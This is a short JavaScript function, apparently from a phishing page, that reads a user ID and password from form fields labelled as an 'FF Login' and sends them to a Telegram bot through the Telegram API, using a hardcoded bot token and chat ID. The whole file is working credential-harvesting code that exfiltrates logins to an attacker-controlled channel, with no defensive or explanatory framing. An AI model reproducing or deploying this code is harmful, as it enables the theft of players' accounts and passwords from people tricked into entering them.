function sendToTelegram() {
  const uid = document.getElementById("uid").value;
  const pass = document.getElementById("pass").value;

  const message = `FF Login\nUser: ${uid}\nPass: ${pass}`;
  const token = "7741229374:AAF7RZDHiyUp31GVh5LISuavRzwXGwC8HtQ";
  const chatId = "7462084516";

  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

  fetch(url)
    .then(response => alert("Sent to Telegram!"))
    .catch(error => alert("Failed to send"));
}
